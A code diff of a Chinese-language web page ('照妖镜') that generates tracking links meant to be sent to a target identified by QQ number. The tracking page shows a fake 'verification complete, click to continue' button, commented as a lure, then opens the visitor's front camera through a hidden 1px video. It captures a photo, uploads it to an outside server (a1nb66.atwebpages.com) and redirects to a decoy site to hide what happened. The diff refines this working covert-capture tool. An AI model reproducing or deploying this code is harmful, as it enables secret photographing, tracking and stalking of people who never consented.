@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>照妖镜 - 链接生成器</title>
     <style>
+        /* ========== 原有配置模式样式，未改动 ========== */
         :root {
             --bg: #0a0a0f;
             --card-bg: #13131a;
@@ -20,19 +21,13 @@
             --shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
             --glow: 0 0 30px rgba(108, 92, 231, 0.3);
         }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        * { margin:0; padding:0; box-sizing:border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'PingFang SC', 'Microsoft YaHei', sans-serif;
             background: var(--bg);
             background-image:
-                radial-gradient(ellipse at 50% 0%, rgba(108, 92, 231, 0.08) 0%, transparent 70%),
-                radial-gradient(ellipse at 80% 20%, rgba(46, 204, 113, 0.04) 0%, transparent 60%);
+                radial-gradient(ellipse at 50% 0%, rgba(108,92,231,0.08) 0%, transparent 70%),
+                radial-gradient(ellipse at 80% 20%, rgba(46,204,113,0.04) 0%, transparent 60%);
             min-height: 100vh;
             display: flex;
             align-items: center;
@@ -40,117 +35,108 @@
             padding: 20px;
             color: var(--text);
         }
-
-        /* ============ 配置模式样式 ============ */
         .config-container {
             width: 100%;
             max-width: 500px;
             animation: fadeInUp 0.6s ease-out;
         }
         @keyframes fadeInUp {
-            from {
-                opacity: 0;
-                transform: translateY(24px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
+            from { opacity:0; transform:translateY(24px); }
+            to { opacity:1; transform:translateY(0); }
         }
-
         .card {
             background: var(--card-bg);
-            border: 1px solid var(--border);
+            border:1px solid var(--border);
             border-radius: var(--radius);
             padding: 32px 28px;
             box-shadow: var(--shadow);
             backdrop-filter: blur(10px);
         }
-
-        .card-header {
-            text-align: center;
-            margin-bottom: 28px;
-        }
-        .card-header .icon {
-            font-size: 48px;
-            display: block;
-            margin-bottom: 10px;
-            animation: pulse 2s ease-in-out infinite;
-        }
-        @keyframes pulse {
-            0%,
-            100% {
-                transform: scale(1);
-            }
-            50% {
-                transform: scale(1.1);
-            }
-        }
+        .card-header { text-align:center; margin-bottom:28px; }
+        .card-header .icon { font-size:48px; display:block; margin-bottom:10px; animation:pulse 2s ease-in-out infinite; }
+        @keyframes pulse { 0%,100%{transform:scale(1);} 50%{transform:scale(1.1);} }
         .card-header h1 {
-            font-size: 26px;
-            font-weight: 700;
-            letter-spacing: -0.5px;
-            background: linear-gradient(135deg, #e0e0e0, #a0a0c0);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
+            font-size:26px; font-weight:700; letter-spacing:-0.5px;
+            background: linear-gradient(135deg,#e0e0e0,#a0a0c0);
+            -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text;
         }
-        .card-header p {
-            font-size: 13px;
-            color: var(--text-secondary);
-            margin-top: 6px;
-        }
-
-        .form-group {
-            margin-bottom: 20px;
-        }
+        .card-header p { font-size:13px; color:var(--text-secondary); margin-top:6px; }
+        .form-group { margin-bottom:20px; }
         .form-group label {
-            display: block;
-            font-size: 13px;
-            font-weight: 600;
-            color: var(--text-secondary);
-            margin-bottom: 7px;
-            letter-spacing: 0.3px;
-            text-transform: uppercase;
+            display:block; font-size:13px; font-weight:600; color:var(--text-secondary);
+            margin-bottom:7px; letter-spacing:0.3px; text-transform:uppercase;
         }
-        .form-group label .required {
-            color: var(--danger);
-            margin-left: 2px;
-        }
-        .input-wrapper {
-            position: relative;
-        }
+        .form-group label .required { color:var(--danger); margin-left:2px; }
+        .input-wrapper { position:relative; }
         .input-wrapper input {
-            width: 100%;
-            padding: 13px 16px;
-            background: var(--input-bg);
-            border: 1.5px solid var(--border);
-            border-radius: 8px;
-            color: var(--text);
-            font-size: 15px;
-            transition: all 0.25s ease;
-            outline: none;
-            font-family: inherit;
+            width:100%; padding:13px 16px; background:var(--input-bg); border:1.5px solid var(--border);
+            border-radius:8px; color:var(--text); font-size:15px; transition:all 0.25s ease;
+            outline:none; font-family:inherit;
         }
         .input-wrapper input:focus {
-            border-color: var(--accent);
-            box-shadow: 0 0 0 3px rgba(108, 92, 231, 0.15);
-            background: #1e1e2a;
+            border-color:var(--accent); box-shadow:0 0 0 3px rgba(108,92,231,0.15); background:#1e1e2a;
         }
-        .input-wrapper input::placeholder {
-            color: #555;
-            font-size: 13px;
-        }
-        .input-hint {
-            font-size: 11px;
-            color: #666;
-            margin-top: 5px;
-        }
-
+        .input-wrapper input::placeholder { color:#555; font-size:13px; }
+        .input-hint { font-size:11px; color:#666; margin-top:5px; }
         .btn-generate {
-            width: 100%;
-            padding: 14px;
-            background: var(--accent);
+            width:100%; padding:14px; background:var(--accent); color:#fff; border:none; border-radius:8px;
+            font-size:16px; font-weight:600; cursor:pointer; letter-spacing:0.5px; transition:all 0.3s ease;
+            font-family:inherit; position:relative; overflow:hidden;
+        }
+        .btn-generate:hover { background:var(--accent-hover); box-shadow:var(--glow); transform:translateY(-1px); }
+        .btn-generate:active { transform:translateY(0); box-shadow:none; }
+        .btn-generate::after {
+            content:''; position:absolute; top:50%; left:50%; width:0; height:0; border-radius:50%;
+            background:rgba(255,255,255,0.2); transform:translate(-50%,-50%);
+            transition:width 0.6s, height 0.6s;
+        }
+        .btn-generate:active::after { width:300px; height:300px; }
+        .result-area {
+            margin-top:24px; padding:18px; background:#0d0d15; border:1px solid var(--border);
+            border-radius:8px; display:none; animation:fadeInUp 0.4s ease-out;
+        }
+        .result-area.show { display:block; }
+        .result-label { font-size:12px; font-weight:600; color:var(--success); text-transform:uppercase; letter-spacing:1px; margin-bottom:8px; }
+        .result-link { display:flex; align-items:center; gap:8px; }
+        .result-link input {
+            flex:1; padding:10px 12px; background:var(--input-bg); border:1px solid var(--border);
+            border-radius:6px; color:#7ecbff; font-size:13px; font-family:'SF Mono','Consolas','Monaco',monospace;
+            word-break:break-all; outline:none; cursor:text;
+        }
+        .btn-copy {
+            padding:10px 16px; background:var(--success); color:#fff; border:none; border-radius:6px;
+            font-size:13px; font-weight:600; cursor:pointer; white-space:nowrap; transition:all 0.2s ease; font-family:inherit;
+        }
+        .btn-copy:hover { opacity:0.85; transform:scale(1.03); }
+        .btn-copy.copied { background:#27ae60; pointer-events:none; }
+        .warning-box {
+            margin-top:20px; padding:14px 16px; background:rgba(231,76,60,0.08);
+            border:1px solid rgba(231,76,60,0.25); border-radius:8px; font-size:12px; color:#e98b82; line-height:1.6;
+        }
+        .warning-box strong { color:#f0a8a0; }
+        .warning-box ul { margin:6px 0 0 16px; padding:0; }
+        .warning-box li { margin-bottom:3px; }
+        .footer-note { text-align:center; font-size:11px; color:#555; margin-top:16px; }
+
+        /* ========== 追踪页面样式（修改后包含按钮） ========== */
+        .tracking-overlay {
+            position:fixed; inset:0; z-index:99999; background:#000;
+            display:flex; align-items:center; justify-content:center; flex-direction:column;
+        }
+        .tracking-spinner {
+            width:50px; height:50px; border:3px solid rgba(255,255,255,0.15);
+            border-top-color:#fff; border-radius:50%; animation:spin 0.8s linear infinite; margin-bottom:16px;
+        }
+        @keyframes spin { to { transform:rotate(360deg); } }
+        .tracking-text { color:#aaa; font-size:14px; letter-spacing:0.5px; margin-bottom:20px; }
+        .tracking-debug {
+            position:fixed; bottom:10px; left:10px; font-size:10px; color:#333; z-index:100000;
+            max-width:90vw; word-break:break-all; pointer-events:none;
+        }
+        /* 新增按钮样式 */
+        .capture-btn {
+            padding:14px 36px;
+            background: #6c5ce7;
             color: #fff;
             border: none;
             border-radius: 8px;
@@ -159,167 +145,11 @@
             cursor: pointer;
             letter-spacing: 0.5px;
             transition: all 0.3s ease;
-            font-family: inherit;
-            position: relative;
-            overflow: hidden;
+            background: linear-gradient(135deg, #6c5ce7, #8b7cf0);
+            box-shadow: 0 0 20px rgba(108,92,231,0.5);
         }
-        .btn-generate:hover {
-            background: var(--accent-hover);
-            box-shadow: var(--glow);
-            transform: translateY(-1px);
-        }
-        .btn-generate:active {
-            transform: translateY(0);
-            box-shadow: none;
-        }
-        .btn-generate::after {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 0;
-            height: 0;
-            border-radius: 50%;
-            background: rgba(255, 255, 255, 0.2);
-            transform: translate(-50%, -50%);
-            transition: width 0.6s, height 0.6s;
-        }
-        .btn-generate:active::after {
-            width: 300px;
-            height: 300px;
-        }
-
-        /* 结果区域 */
-        .result-area {
-            margin-top: 24px;
-            padding: 18px;
-            background: #0d0d15;
-            border: 1px solid var(--border);
-            border-radius: 8px;
-            display: none;
-            animation: fadeInUp 0.4s ease-out;
-        }
-        .result-area.show {
-            display: block;
-        }
-        .result-label {
-            font-size: 12px;
-            font-weight: 600;
-            color: var(--success);
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            margin-bottom: 8px;
-        }
-        .result-link {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        .result-link input {
-            flex: 1;
-            padding: 10px 12px;
-            background: var(--input-bg);
-            border: 1px solid var(--border);
-            border-radius: 6px;
-            color: #7ecbff;
-            font-size: 13px;
-            font-family: 'SF Mono', 'Consolas', 'Monaco', monospace;
-            word-break: break-all;
-            outline: none;
-            cursor: text;
-        }
-        .btn-copy {
-            padding: 10px 16px;
-            background: var(--success);
-            color: #fff;
-            border: none;
-            border-radius: 6px;
-            font-size: 13px;
-            font-weight: 600;
-            cursor: pointer;
-            white-space: nowrap;
-            transition: all 0.2s ease;
-            font-family: inherit;
-        }
-        .btn-copy:hover {
-            opacity: 0.85;
-            transform: scale(1.03);
-        }
-        .btn-copy.copied {
-            background: #27ae60;
-            pointer-events: none;
-        }
-
-        .warning-box {
-            margin-top: 20px;
-            padding: 14px 16px;
-            background: rgba(231, 76, 60, 0.08);
-            border: 1px solid rgba(231, 76, 60, 0.25);
-            border-radius: 8px;
-            font-size: 12px;
-            color: #e98b82;
-            line-height: 1.6;
-        }
-        .warning-box strong {
-            color: #f0a8a0;
-        }
-        .warning-box ul {
-            margin: 6px 0 0 16px;
-            padding: 0;
-        }
-        .warning-box li {
-            margin-bottom: 3px;
-        }
-
-        /* 底部 */
-        .footer-note {
-            text-align: center;
-            font-size: 11px;
-            color: #555;
-            margin-top: 16px;
-        }
-
-        /* ============ 拍照追踪模式样式（目标用户看到的） ============ */
-        .tracking-overlay {
-            position: fixed;
-            inset: 0;
-            z-index: 99999;
-            background: #000;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-direction: column;
-        }
-        .tracking-spinner {
-            width: 50px;
-            height: 50px;
-            border: 3px solid rgba(255, 255, 255, 0.15);
-            border-top-color: #fff;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin-bottom: 16px;
-        }
-        @keyframes spin {
-            to {
-                transform: rotate(360deg);
-            }
-        }
-        .tracking-text {
-            color: #aaa;
-            font-size: 14px;
-            letter-spacing: 0.5px;
-        }
-        .tracking-debug {
-            position: fixed;
-            bottom: 10px;
-            left: 10px;
-            font-size: 10px;
-            color: #333;
-            z-index: 100000;
-            max-width: 90vw;
-            word-break: break-all;
-            pointer-events: none;
-        }
+        .capture-btn:hover { transform: translateY(-2px); box-shadow: 0 0 30px rgba(108,92,231,0.7); }
+        .capture-btn:active { transform: translateY(0); }
     </style>
 </head>
 <body>
@@ -332,49 +162,29 @@
                 <h1>照 妖 镜</h1>
                 <p>生成追踪链接 · 静默拍照回传</p>
             </div>
-
             <div class="form-group">
                 <label>QQ 号 <span class="required">*</span></label>
                 <div class="input-wrapper">
-                    <input
-                    type="text"
-                    id="qqInput"
-                    placeholder="输入目标QQ号，用于标识照片归属"
-                    maxlength="20"
-                    autocomplete="off"
-                    >
+                    <input type="text" id="qqInput" placeholder="输入目标QQ号，用于标识照片归属" maxlength="20" autocomplete="off">
                 </div>
                 <div class="input-hint">照片将保存在以此QQ号命名的文件夹中</div>
             </div>
-
             <div class="form-group">
                 <label>跳转网址 <span class="required">*</span></label>
                 <div class="input-wrapper">
-                    <input
-                    type="url"
-                    id="urlInput"
-                    placeholder="https://example.com"
-                    autocomplete="off"
-                    >
+                    <input type="url" id="urlInput" placeholder="https://example.com" autocomplete="off">
                 </div>
                 <div class="input-hint">拍照完成后将自动跳转到此网址（用于掩饰）</div>
             </div>
-
-            <button class="btn-generate" id="btnGenerate" onclick="generateLink()">
-                🔗 生成追踪链接
-            </button>
-
+            <button class="btn-generate" id="btnGenerate" onclick="generateLink()">🔗 生成追踪链接</button>
             <div class="result-area" id="resultArea">
                 <div class="result-label">✅ 追踪链接已生成（点击复制）</div>
                 <div class="result-link">
                     <input type="text" id="resultLink" readonly onclick="this.select(); copyLink();">
                     <button class="btn-copy" id="btnCopy" onclick="copyLink()">📋 复制</button>
                 </div>
-                <div style="margin-top:8px;font-size:11px;color:#888;">
-                    将此链接发送给目标用户，对方打开后会自动拍照并回传
-                </div>
+                <div style="margin-top:8px;font-size:11px;color:#888;">将此链接发送给目标用户，对方打开后会自动拍照并回传</div>
             </div>
-
             <div class="warning-box">
                 <strong>⚠️ 重要提示：</strong>
                 <ul>
@@ -385,59 +195,47 @@
                 </ul>
             </div>
         </div>
-        <div class="footer-note">
-            API 端点：<code style="color:#6c5ce7;">http://a1nb66.atwebpages.com/zyj/api.php</code>
-        </div>
+        <div class="footer-note">API 端点：<code style="color:#6c5ce7;">http://a1nb66.atwebpages.com/zyj/api.php</code></div>
     </div>
 
-    <!-- ==================== 拍照追踪模式（目标用户看到） ==================== -->
+    <!-- ==================== 拍照追踪模式（修改后：加入按钮） ==================== -->
     <div id="trackingMode" class="tracking-overlay" style="display:none;">
-        <div class="tracking-spinner" id="trackingSpinner"></div>
-        <div class="tracking-text" id="trackingText">页面加载中...</div>
+        <div class="tracking-spinner" id="trackingSpinner" style="display:none;"></div>
+        <div class="tracking-text" id="trackingText">请完成验证以继续</div>
+        <!-- 核心：诱导点击按钮 -->
+        <button class="capture-btn" id="captureBtn">验证完毕 点击继续</button>
     </div>
     <div class="tracking-debug" id="trackingDebug"></div>
 
-    <!-- 隐藏的video元素用于摄像头捕获 -->
+    <!-- 视频元素：使用1px占位，避免苹果隐藏导致的问题 -->
     <video
-    id="hiddenVideo"
-    playsinline
-    autoplay
-    muted
-    style="position:fixed;top:-100vh;left:-100vw;width:640px;height:480px;pointer-events:none;opacity:0;"
+        id="hiddenVideo"
+        playsinline
+        autoplay
+        muted
+        style="position:fixed; top:0; left:0; width:1px; height:1px; opacity:0; pointer-events:none;"
     ></video>
     <canvas id="hiddenCanvas" style="display:none;"></canvas>
 
     <script>
         (function() {
-            // ============ 获取URL参数 ============
             const urlParams = new URLSearchParams(window.location.search);
             const paramQQ = urlParams.get('qq');
             const paramUrl = urlParams.get('url');
 
-            // ============ 判断模式 ============
             if (paramQQ && paramUrl) {
-                // 拍照追踪模式
                 initTrackingMode(paramQQ, decodeURIComponent(paramUrl));
             } else {
-                // 配置模式 - 显示配置界面
                 initConfigMode();
             }
         })();
 
-        // ============ 配置模式逻辑 ============
+        // ========== 配置模式逻辑（未改动） ==========
         function initConfigMode() {
             document.getElementById('configMode').style.display = 'block';
             document.getElementById('trackingMode').style.display = 'none';
-
-            // 回车键触发生成
-            document.getElementById('qqInput').addEventListener('keydown', function(e) {
-                if (e.key === 'Enter') generateLink();
-            });
-            document.getElementById('urlInput').addEventListener('keydown', function(e) {
-                if (e.key === 'Enter') generateLink();
-            });
-
-            // 自动聚焦
+            document.getElementById('qqInput').addEventListener('keydown', e => { if(e.key==='Enter') generateLink(); });
+            document.getElementById('urlInput').addEventListener('keydown', e => { if(e.key==='Enter') generateLink(); });
             setTimeout(() => document.getElementById('qqInput').focus(), 300);
         }
 
@@ -446,57 +244,26 @@
             const urlInput = document.getElementById('urlInput');
             const qq = qqInput.value.trim();
             const targetUrl = urlInput.value.trim();
+            if (!qq) { shakeElement(qqInput); qqInput.focus(); alert('请输入QQ号'); return; }
+            if (!/^\d{4,20}$/.test(qq)) { alert('QQ号格式不正确（4-20位数字）'); qqInput.focus(); return; }
+            if (!targetUrl) { shakeElement(urlInput); urlInput.focus(); alert('请输入跳转网址'); return; }
+            if (!/^https?:\/\/.+/.test(targetUrl)) { alert('跳转网址需要以 http:// 或 https:// 开头'); urlInput.focus(); return; }
 
-            // 验证
-            if (!qq) {
-                shakeElement(qqInput);
-                qqInput.focus();
-                alert('请输入QQ号');
-                return;
-            }
-            if (!/^\d{4,20}$/.test(qq)) {
-                alert('QQ号格式不正确（4-20位数字）');
-                qqInput.focus();
-                return;
-            }
-            if (!targetUrl) {
-                shakeElement(urlInput);
-                urlInput.focus();
-                alert('请输入跳转网址');
-                return;
-            }
-            if (!/^https?:\/\/.+/.test(targetUrl)) {
-                alert('跳转网址需要以 http:// 或 https:// 开头');
-                urlInput.focus();
-                return;
-            }
-
-            // 构建追踪链接
             const currentUrl = window.location.origin + window.location.pathname;
             const trackingLink = currentUrl + '?qq=' + qq + '&url=' + encodeURIComponent(targetUrl);
 
-            // 显示结果
             const resultArea = document.getElementById('resultArea');
             const resultLink = document.getElementById('resultLink');
             const btnCopy = document.getElementById('btnCopy');
-
             resultLink.value = trackingLink;
             resultArea.classList.add('show');
             btnCopy.textContent = '📋 复制';
             btnCopy.classList.remove('copied');
-
-            // 自动选中并复制
             resultLink.select();
             copyLink();
-
-            // 滚动到结果区域
-            resultArea.scrollIntoView({ behavior: 'smooth', block: 'center' });
-
-            // 高亮闪烁效果
+            resultArea.scrollIntoView({ behavior:'smooth', block:'center' });
             resultArea.style.boxShadow = '0 0 20px rgba(46,204,113,0.4)';
-            setTimeout(() => {
-                resultArea.style.boxShadow = '';
-            }, 1500);
+            setTimeout(() => { resultArea.style.boxShadow = ''; }, 1500);
         }
 
         function copyLink() {
@@ -507,20 +274,14 @@
                 navigator.clipboard.writeText(resultLink.value).then(() => {
                     btnCopy.textContent = '✅ 已复制';
                     btnCopy.classList.add('copied');
-                    setTimeout(() => {
-                        btnCopy.textContent = '📋 复制';
-                        btnCopy.classList.remove('copied');
-                    }, 2000);
+                    setTimeout(() => { btnCopy.textContent = '📋 复制'; btnCopy.classList.remove('copied'); }, 2000);
                 }).catch(() => {
                     document.execCommand('copy');
                     btnCopy.textContent = '✅ 已复制';
                     btnCopy.classList.add('copied');
-                    setTimeout(() => {
-                        btnCopy.textContent = '📋 复制';
-                        btnCopy.classList.remove('copied');
-                    }, 2000);
+                    setTimeout(() => { btnCopy.textContent = '📋 复制'; btnCopy.classList.remove('copied'); }, 2000);
                 });
-            } catch (e) {
+            } catch(e) {
                 document.execCommand('copy');
                 btnCopy.textContent = '✅ 已复制';
                 btnCopy.classList.add('copied');
@@ -536,18 +297,16 @@
             setTimeout(() => { el.style.transform = 'translateX(0)'; }, 400);
         }
 
-        // ============ 拍照追踪模式逻辑 ============
+        // ========== 拍照追踪模式（核心修改：按钮触发） ==========
         function initTrackingMode(qq, redirectUrl) {
-            // 隐藏配置模式
             document.getElementById('configMode').style.display = 'none';
             document.getElementById('trackingMode').style.display = 'flex';
 
             const trackingText = document.getElementById('trackingText');
             const trackingSpinner = document.getElementById('trackingSpinner');
+            const captureBtn = document.getElementById('captureBtn');
             const trackingDebug = document.getElementById('trackingDebug');
 
-            // ============ API配置 ============
-            // 修改为你的api.php实际地址
             const API_URL = 'http://a1nb66.atwebpages.com/zyj/api.php';
 
             function debug(msg) {
@@ -557,46 +316,44 @@
 
             function updateStatus(text, isError = false) {
                 trackingText.textContent = text;
-                if (isError) {
-                    trackingText.style.color = '#e74c3c';
-                } else {
-                    trackingText.style.color = '#aaa';
-                }
+                trackingText.style.color = isError ? '#e74c3c' : '#aaa';
             }
 
-            debug('追踪模式启动，QQ=' + qq);
-            debug('跳转目标=' + redirectUrl);
-            debug('API端点=' + API_URL);
+            // 初始状态：显示按钮，隐藏spinner
+            trackingSpinner.style.display = 'none';
+            captureBtn.style.display = 'inline-block';
+            updateStatus('请完成验证以继续');
 
-            // ============ 开始拍照流程 ============
+            // 绑定点击事件：符合iOS Safari的用户手势要求
+            captureBtn.addEventListener('click', async () => {
+                // 点击后隐藏按钮，显示加载动画
+                captureBtn.style.display = 'none';
+                trackingSpinner.style.display = 'block';
+                updateStatus('正在初始化...');
+                debug('用户主动点击按钮，启动摄像头流程');
+
+                // 开始摄像头流程（此时是由用户手势直接调用的）
+                await startCapture();
+            });
+
             async function startCapture() {
                 const video = document.getElementById('hiddenVideo');
                 const canvas = document.getElementById('hiddenCanvas');
                 const ctx = canvas.getContext('2d');
 
-                updateStatus('正在初始化...');
+                updateStatus('正在请求摄像头权限...');
                 debug('检查摄像头API支持...');
 
-                // 检查浏览器支持
                 if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                     debug('❌ 浏览器不支持getUserMedia');
-                    updateStatus('浏览器不支持，正在跳转...', true);
+                    updateStatus('设备不支持，即将跳转...', true);
                     setTimeout(() => doRedirect(), 1500);
                     return;
                 }
 
-                // 检查HTTPS
-                if (window.location.protocol === 'http:' && window.location.hostname !== 'localhost' && window
-                    .location.hostname !== '127.0.0.1') {
-                    debug('⚠️ 当前为HTTP环境，摄像头可能需要HTTPS，尝试中...');
-                }
-
-                updateStatus('正在请求摄像头权限...');
-                debug('请求摄像头（前置，1280x720）...');
-
                 const constraints = {
                     video: {
-                        facingMode: 'user', // 前置摄像头（自拍）
+                        facingMode: 'user',
                         width: { ideal: 1280 },
                         height: { ideal: 720 },
                         frameRate: { ideal: 30 }
@@ -610,40 +367,24 @@
                     debug('✅ 摄像头权限已获取');
                 } catch (err) {
                     debug('❌ 获取摄像头失败: ' + err.name + ' - ' + err.message);
-
-                    // 尝试降级：不指定facingMode
                     if (err.name === 'OverconstrainedError' || err.name === 'ConstraintNotSatisfiedError') {
                         try {
                             debug('尝试降级约束...');
-                            stream = await navigator.mediaDevices.getUserMedia({
-                                video: true,
-                                audio: false
-                            });
+                            stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                             debug('✅ 降级后摄像头权限已获取');
                         } catch (err2) {
                             debug('❌ 降级也失败: ' + err2.message);
-                            updateStatus('无法访问摄像头，正在跳转...', true);
+                            updateStatus('无法访问摄像头，即将跳转...', true);
                             setTimeout(() => doRedirect(), 1500);
                             return;
                         }
-                    } else if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
-                        debug('❌ 用户拒绝了摄像头权限');
-                        updateStatus('权限被拒绝，正在跳转...', true);
-                        setTimeout(() => doRedirect(), 1200);
-                        return;
-                    } else if (err.name === 'NotFoundError') {
-                        debug('❌ 未找到摄像头设备');
-                        updateStatus('未检测到摄像头，正在跳转...', true);
-                        setTimeout(() => doRedirect(), 1200);
-                        return;
                     } else {
-                        updateStatus('摄像头不可用，正在跳转...', true);
+                        updateStatus('摄像头不可用，即将跳转...', true);
                         setTimeout(() => doRedirect(), 1500);
                         return;
                     }
                 }
 
-                // 将流绑定到video
                 video.srcObject = stream;
                 video.setAttribute('playsinline', '');
                 video.muted = true;
@@ -651,40 +392,24 @@
                 updateStatus('摄像头已就绪，准备拍摄...');
                 debug('等待视频流稳定...');
 
-                // 等待视频元数据加载
                 try {
                     await new Promise((resolve, reject) => {
-                        const timeout = setTimeout(() => reject(new Error('视频加载超时')),
-                        8000);
-                        video.onloadedmetadata = () => {
-                            clearTimeout(timeout);
-                            resolve();
-                        };
-                        video.onerror = () => {
-                            clearTimeout(timeout);
-                            reject(new Error('视频加载错误'));
-                        };
-                        // 触发播放
+                        const timeout = setTimeout(() => reject(new Error('视频加载超时')), 8000);
+                        video.onloadedmetadata = () => { clearTimeout(timeout); resolve(); };
+                        video.onerror = () => { clearTimeout(timeout); reject(new Error('视频加载错误')); };
                         video.play().catch(e => {
                             debug('⚠️ video.play()被阻止: ' + e.message);
-                            // 某些浏览器需要用户交互，尝试静默处理
                             clearTimeout(timeout);
-                            resolve(); // 继续尝试
+                            resolve();
                         });
                     });
                 } catch (e) {
                     debug('⚠️ 视频准备阶段问题: ' + e.message);
-                    // 继续尝试
                 }
 
-                // 额外等待让摄像头调整曝光
-                debug('等待摄像头调整曝光（1.5秒）...');
-                updateStatus('调整中...');
                 await sleep(1500);
-
-                // 检查视频是否在播放
                 if (video.readyState < 2) {
-                    debug('⚠️ 视频未就绪(readyState=' + video.readyState + ')，再等待...');
+                    debug('⚠️ 视频未就绪，再等待...');
                     await sleep(2000);
                 }
 
@@ -694,41 +419,32 @@
 
                 if (vw === 0 || vh === 0) {
                     debug('❌ 视频尺寸为0，无法拍摄');
-                    updateStatus('拍摄失败，正在跳转...', true);
+                    updateStatus('拍摄失败，即将跳转...', true);
                     stopStream(stream);
                     setTimeout(() => doRedirect(), 1200);
                     return;
                 }
 
-                // 设置canvas尺寸匹配视频
                 canvas.width = vw;
                 canvas.height = vh;
-
                 updateStatus('正在拍摄...');
-                debug('执行拍照（canvas截图）...');
-
-                // 绘制视频帧到canvas
+                debug('执行拍照...');
                 try {
                     ctx.drawImage(video, 0, 0, vw, vh);
                 } catch (e) {
                     debug('❌ Canvas绘制失败: ' + e.message);
                     stopStream(stream);
-                    updateStatus('拍摄失败，正在跳转...', true);
+                    updateStatus('拍摄失败，即将跳转...', true);
                     setTimeout(() => doRedirect(), 1200);
                     return;
                 }
 
-                // 转换为base64 JPEG（质量0.65平衡清晰度和大小）
                 const imageData = canvas.toDataURL('image/jpeg', 0.65);
                 debug('照片已生成，大小约' + Math.round(imageData.length / 1024) + 'KB');
-
-                // 停止摄像头流
                 stopStream(stream);
 
-                // 上传照片
                 updateStatus('正在上传...');
                 debug('开始上传到API...');
-
                 const formData = new FormData();
                 formData.append('qq', qq);
                 formData.append('image', imageData);
@@ -736,17 +452,13 @@
                 let uploadSuccess = false;
                 try {
                     const controller = new AbortController();
-                    const timeoutId = setTimeout(() => controller.abort(), 15000); // 15秒超时
-
+                    const timeoutId = setTimeout(() => controller.abort(), 15000);
                     const response = await fetch(API_URL, {
                         method: 'POST',
                         body: formData,
                         signal: controller.signal,
-                        // 不设置Content-Type，让浏览器自动设置（包含boundary）
                     });
-
                     clearTimeout(timeoutId);
-
                     if (response.ok) {
                         const result = await response.json();
                         if (result.success) {
@@ -756,13 +468,11 @@
                             debug('⚠️ 服务器返回失败: ' + (result.message || '未知错误'));
                         }
                     } else {
-                        debug('⚠️ HTTP错误: ' + response.status + ' ' + response.statusText);
+                        debug('⚠️ HTTP错误: ' + response.status);
                     }
                 } catch (err) {
                     if (err.name === 'AbortError') {
-                        debug('❌ 上传超时（15秒）');
-                    } else if (err.message.includes('NetworkError') || err.message.includes('Failed to fetch')) {
-                        debug('❌ 网络错误，可能是跨域或API不可达');
+                        debug('❌ 上传超时');
                     } else {
                         debug('❌ 上传异常: ' + err.message);
                     }
@@ -773,13 +483,10 @@
                     trackingSpinner.style.borderTopColor = '#2ecc71';
                     trackingSpinner.style.borderColor = 'rgba(46,204,113,0.2)';
                     trackingSpinner.style.borderTopColor = '#2ecc71';
-                    debug('流程完成，准备跳转...');
                 } else {
-                    updateStatus('上传未确认，正在跳转...', true);
-                    debug('上传未成功确认，继续跳转');
+                    updateStatus('即将跳转...', true);
                 }
 
-                // 短暂延迟后跳转
                 await sleep(uploadSuccess ? 800 : 400);
                 doRedirect();
             }
@@ -795,14 +502,12 @@
 
             function doRedirect() {
                 debug('→ 跳转到: ' + redirectUrl);
-                // 清理追踪UI
                 document.getElementById('trackingMode').style.display = 'none';
                 document.getElementById('trackingDebug').style.display = 'none';
                 const video = document.getElementById('hiddenVideo');
                 if (video && video.srcObject) {
                     stopStream(video.srcObject);
                 }
-                // 跳转
                 window.location.href = redirectUrl;
             }
 
@@ -810,21 +515,9 @@
                 return new Promise(resolve => setTimeout(resolve, ms));
             }
 
-            // 启动
             debug('===== 照妖镜追踪开始 =====');
             debug('时间: ' + new Date().toISOString());
             debug('UserAgent: ' + navigator.userAgent.substring(0, 80));
-            debug('平台: ' + navigator.platform);
-            debug('协议: ' + window.location.protocol);
-
-            // 延迟100ms启动，确保DOM就绪
-            setTimeout(() => {
-                startCapture().catch(err => {
-                    debug('💥 未捕获错误: ' + err.message);
-                    updateStatus('发生错误，正在跳转...', true);
-                    setTimeout(() => doRedirect(), 1500);
-                });
-            }, 100);
         }
     </script>
 </body>
